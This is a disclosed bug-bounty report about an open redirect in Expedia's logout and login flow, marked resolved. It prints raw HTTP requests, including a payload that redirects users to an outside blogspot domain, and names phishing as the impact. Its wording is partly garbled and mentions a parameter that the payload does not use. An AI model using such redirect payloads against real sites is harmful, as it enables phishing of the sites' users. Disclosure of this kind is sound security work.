---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1788006'
original_report_id: '1788006'
title: Open Redirect in Logout & Login
weakness: Open Redirect
team_handle: expediagroup_bbp
created_at: '2022-11-29T12:16:24.770Z'
disclosed_at: '2023-03-02T18:20:55.437Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 149
asset_identifier: www.expedia.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- open-redirect
---

# Open Redirect in Logout & Login

## Metadata

- HackerOne Report ID: 1788006
- Weakness: Open Redirect
- Program: expediagroup_bbp
- Disclosed At: 2023-03-02T18:20:55.437Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

## Entry
Hello there! While browsing on expedia, I logged out of the account and as soon as I logged out, it was calling me a parameter called "rurl" directly on the link, I examined it and was able to redirect successfully.

## Default Request

GET /?logout=1 HTTP/2
Host: www.expedia.com
Cookie:  { REDACTED }
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers

## Default Response

HTTP/2 200 OK

##In response, it redirects us to the homepage.

## Vulnerability Request

GET /?logout=https://qx4lw1nsec.blogspot.com HTTP/2
Host: www.expedia.com
Cookie: { REDACTED }
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers


## Note
The part that exposes to explicit redirection is "?" in the section after the address. is use.
and whatever he does he will throw redirects.

## Video
{F2053834}

## Impact

Redirect
Phishing
Social Engineering

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
